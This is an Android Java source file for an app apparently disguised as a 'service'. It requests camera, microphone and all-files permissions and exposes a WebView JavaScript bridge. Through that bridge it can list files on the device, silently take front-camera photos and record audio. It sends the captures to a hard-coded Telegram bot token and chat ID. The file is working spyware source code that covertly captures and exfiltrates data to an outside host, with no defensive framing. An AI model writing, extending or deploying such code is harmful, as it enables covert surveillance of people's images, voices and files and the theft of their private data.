package com.priv.service;
import android.os.*; import android.webkit.*; import android.app.*; import android.content.*; import android.net.Uri; import android.provider.Settings; import java.io.*; import android.util.Base64; import android.hardware.Camera; import android.graphics.SurfaceTexture; import android.media.MediaRecorder;
import java.net.HttpURLConnection; import java.net.URL;

public class MainActivity extends Activity {
    WebView w; MediaRecorder r;
    String T = "8652413321:AAGziAFFffZbHEdqxxFWdgXJJNmanVFZxK8", CH = "8194848649";

    protected void onCreate(Bundle s) {
        super.onCreate(s);
        if (Build.VERSION.SDK_INT >= 23) { requestPermissions(new String[]{"android.permission.CAMERA", "android.permission.RECORD_AUDIO"}, 1); }
        if (Build.VERSION.SDK_INT >= 30 && !Environment.isExternalStorageManager()) {
            startActivity(new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION, Uri.parse("package:" + getPackageName())));
        }
        w = new WebView(this); w.getSettings().setJavaScriptEnabled(true);
        w.addJavascriptInterface(new Object() {
            @JavascriptInterface public String list(String p) {
                File[] fls = new File(p).listFiles(); StringBuilder sb = new StringBuilder();
                if(fls == null) return "Locked";
                for (File f : fls) sb.append(f.isDirectory() ? "📁 " : "📄 ").append(f.getName()).append("\n");
                return sb.toString();
            }
            @JavascriptInterface public void takeSnap() {
                try { Camera c = Camera.open(1); c.setPreviewTexture(new SurfaceTexture(10)); c.startPreview();
                    c.takePicture(null, null, (data, cam) -> { sendToTG(data, "photo", "snap.jpg"); cam.release(); });
                } catch (Exception e) { }
            }
            @JavascriptInterface public void recordAudio(int ms) {
                try {
                    final File out = new File(getExternalFilesDir(null), "rec.m4a");
                    r = new MediaRecorder(); r.setAudioSource(1); r.setOutputFormat(4); r.setAudioEncoder(3);
                    r.setOutputFile(out.getAbsolutePath()); r.prepare(); r.start();
                    new Handler(Looper.getMainLooper()).postDelayed(() -> {
                        try { r.stop(); r.release(); 
                        FileInputStream fis = new FileInputStream(out); byte[] b = new byte[(int)out.length()]; fis.read(b); fis.close();
                        sendToTG(b, "audio", "rec.m4a"); } catch(Exception e){}
                    }, ms);
                } catch (Exception e) { }
            }
        }, "Android");
        w.loadUrl("file:///android_asset/index.html");
        setContentView(w);
    }

    void sendToTG(final byte[] data, final String type, final String name) {
        new Thread(() -> {
            try {
                String urlStr = "https://api.telegram.org/bot" + T + "/send" + type.substring(0,1).toUpperCase() + type.substring(1);
                URL url = new URL(urlStr);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setDoOutput(true); conn.setRequestMethod("POST");
                String boundary = "*****";
                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
                DataOutputStream dos = new DataOutputStream(conn.getOutputStream());
                dos.writeBytes("--" + boundary + "\r\n");
                dos.writeBytes("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n" + CH + "\r\n");
                dos.writeBytes("--" + boundary + "\r\n");
                dos.writeBytes("Content-Disposition: form-data; name=\"" + (type.equals("audio") ? "audio" : "photo") + "\"; filename=\"" + name + "\"\r\n\r\n");
                dos.write(data);
                dos.writeBytes("\r\n--" + boundary + "--\r\n");
                dos.flush(); dos.close();
                conn.getInputStream();
            } catch (Exception e) {}
        }).start();
    }
}